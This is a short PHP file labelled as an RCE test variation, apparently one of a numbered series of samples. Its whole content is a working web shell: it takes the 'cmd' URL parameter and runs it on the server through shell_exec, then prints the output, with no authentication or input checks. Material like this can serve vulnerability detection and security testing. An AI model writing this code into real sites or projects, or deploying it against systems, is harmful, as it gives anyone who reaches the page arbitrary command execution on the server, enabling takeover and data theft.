<?php
// RCE test variation #623
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>